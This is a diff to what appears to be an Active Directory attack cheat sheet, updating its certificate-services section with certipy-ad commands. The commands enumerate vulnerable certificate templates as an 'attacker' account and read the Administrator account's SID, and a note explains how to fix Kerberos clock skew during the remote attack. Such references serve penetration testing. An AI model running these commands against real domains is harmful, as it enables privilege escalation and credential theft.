@@ -191,9 +191,14 @@ python3 getnthash.py -key SESSION_KEY $DOMAIN/target_user
 
 ```shell
 # Rescourse 
-certipy find -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -text -enabled -hide-admins -vulnerable
+certipy-ad find -u 'attacker@corp.local' -p '$PASS' -dc-ip '$DC_IP' -text -enabled -hide-admins -vulnerable
 
-# Follow the process with EC1
+# Requesting Administrator' SID:
+certipy-ad account read -u 'user' -p '$PASS' -dc-ip '$DC_IP' -user 'Administrator' 
+
+# Follow the process with ECS number 
+# When performing this attack remotely, you may encounter the SessionError: KRB_AP_ERR_SKEW (Clock skew too great). This indicates that your machine’s clock is out of sync with the Domain Controller. The simplest solution is to synchronize the clocks using ntpdate.
+sudo ntpdate $DC_IP
 ```
 
 ---
